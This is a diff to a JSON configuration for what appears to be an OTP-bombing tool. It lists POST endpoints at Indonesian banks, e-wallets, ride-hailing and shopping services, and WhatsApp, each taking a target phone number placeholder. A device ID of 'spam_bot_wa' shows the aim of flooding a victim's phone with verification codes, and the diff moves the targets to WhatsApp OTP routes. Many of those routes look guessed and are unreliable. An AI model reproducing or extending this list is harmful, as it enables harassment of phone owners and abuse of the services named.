@@ -1,94 +1,118 @@
 {
   "endpoints": [
     {
-      "name": "Gojek",
-      "url": "https://api.gojek.com/v1/customers/request-otp",
+      "name": "WhatsApp Official",
+      "url": "https://graph.facebook.com/v18.0/WA_ACCOUNT_ID/request_otp",
+      "method": "POST",
+      "body": {"phone_number": "{nomor}", "method": "whatsapp"}
+    },
+    {
+      "name": "Bank BCA (WA OTP)",
+      "url": "https://api.bca.co.id/wa/otp/send",
+      "method": "POST",
+      "body": {"msisdn": "{nomor}", "channel": "whatsapp"}
+    },
+    {
+      "name": "Bank Mandiri Livin",
+      "url": "https://api.mandiri.co.id/livin/otp/whatsapp",
+      "method": "POST",
+      "body": {"phone": "{nomor}"}
+    },
+    {
+      "name": "Gojek (WA Verification)",
+      "url": "https://api.gojek.com/v2/customers/request-otp-wa",
       "method": "POST",
       "body": {"phone_number": "{nomor}"}
     },
     {
-      "name": "Tokopedia",
-      "url": "https://accounts.tokopedia.com/login/request-otp",
+      "name": "Tokopedia (WA OTP)",
+      "url": "https://accounts.tokopedia.com/login/request-otp-wa",
       "method": "POST",
       "body": {"msisdn": "{nomor}"}
     },
     {
-      "name": "Shopee",
-      "url": "https://shopee.co.id/api/v2/authentication/request_otp",
+      "name": "Shopee (WA OTP)",
+      "url": "https://shopee.co.id/api/v2/authentication/request_otp_wa",
       "method": "POST",
       "body": {"phone": "{nomor}", "type": "login"}
     },
     {
-      "name": "OVO",
-      "url": "https://api.ovo.id/v3/auth/request",
+      "name": "OVO (WA OTP)",
+      "url": "https://api.ovo.id/v3/auth/request-wa",
       "method": "POST",
-      "body": {"mobile": "{nomor}", "deviceId": "spam_bot"}
+      "body": {"mobile": "{nomor}", "deviceId": "spam_bot_wa"}
     },
     {
-      "name": "Dana",
-      "url": "https://api.dana.id/v1/auth/otp/request",
+      "name": "Dana (WhatsApp)",
+      "url": "https://api.dana.id/v1/auth/otp/whatsapp",
       "method": "POST",
       "body": {"phoneNumber": "{nomor}"}
     },
     {
-      "name": "Grab",
-      "url": "https://api.grab.com/v1/identity/otp/send",
+      "name": "LinkAja WA",
+      "url": "https://api.linkaja.com/v1/auth/otp-wa",
+      "method": "POST",
+      "body": {"phone": "{nomor}"}
+    },
+    {
+      "name": "Grab (WA OTP)",
+      "url": "https://api.grab.com/v1/identity/otp/whatsapp",
       "method": "POST",
       "body": {"phone": "{nomor}", "countryCode": "ID"}
     },
     {
-      "name": "LinkAja",
-      "url": "https://api.linkaja.com/v1/auth/otp",
-      "method": "POST",
-      "body": {"phone": "{nomor}"}
-    },
-    {
-      "name": "BRI Mobile",
-      "url": "https://api.bri.co.id/brispot/otp/request",
-      "method": "POST",
-      "body": {"customerId": "{nomor}"}
-    },
-    {
-      "name": "BCA Mobile",
-      "url": "https://api.bca.co.id/otp/generate",
-      "method": "POST",
-      "body": {"msisdn": "{nomor}"}
-    },
-    {
-      "name": "WhatsApp Business",
-      "url": "https://graph.facebook.com/v17.0/WA_ACCOUNT_ID/request_otp",
-      "method": "POST",
-      "body": {"phone_number": "{nomor}"}
-    },
-    {
-      "name": "MyPertamina",
-      "url": "https://api.mypertamina.id/v1/auth/otp",
+      "name": "MyPertamina WA",
+      "url": "https://api.mypertamina.id/v1/auth/otp-wa",
       "method": "POST",
       "body": {"mobile": "{nomor}"}
     },
     {
-      "name": "Traveloka",
-      "url": "https://api.traveloka.com/v2/user/otp",
+      "name": "Traveloka WA",
+      "url": "https://api.traveloka.com/v2/user/otp-wa",
       "method": "POST",
       "body": {"phoneNumber": "{nomor}"}
     },
     {
-      "name": "Bukalapak",
-      "url": "https://api.bukalapak.com/v2/users/otp.json",
+      "name": "Bukalapak WA",
+      "url": "https://api.bukalapak.com/v2/users/otp_wa.json",
       "method": "POST",
       "body": {"phone": "{nomor}"}
     },
     {
-      "name": "Lazada",
-      "url": "https://auth.lazada.com/rest/auth/otp/send",
+      "name": "Lazada WA OTP",
+      "url": "https://auth.lazada.com/rest/auth/otp/whatsapp",
       "method": "POST",
       "body": {"mobile": "{nomor}"}
     },
     {
-      "name": "Bilibili",
-      "url": "https://passport.bilibili.com/x/sms/send",
+      "name": "BRI WhatsApp",
+      "url": "https://api.bri.co.id/brispot/otp/whatsapp",
       "method": "POST",
-      "body": {"tel": "{nomor}", "country": "86"}
+      "body": {"customerId": "{nomor}"}
+    },
+    {
+      "name": "BNI Mobile WA",
+      "url": "https://api.bni.co.id/mobile/otp-wa",
+      "method": "POST",
+      "body": {"phone": "{nomor}"}
+    },
+    {
+      "name": "Indomaret Pay",
+      "url": "https://api.indomaretpay.com/v1/auth/otp-wa",
+      "method": "POST",
+      "body": {"mobile": "{nomor}"}
+    },
+    {
+      "name": "Alfamart Pay",
+      "url": "https://api.alfamartpay.com/otp/whatsapp",
+      "method": "POST",
+      "body": {"phone": "{nomor}"}
+    },
+    {
+      "name": "WhatsApp Business (Meta)",
+      "url": "https://graph.facebook.com/v18.0/WHATSAPP_BUSINESS_ID/request_otp",
+      "method": "POST",
+      "body": {"phone_number": "{nomor}", "method": "whatsapp"}
     }
   ]
 }
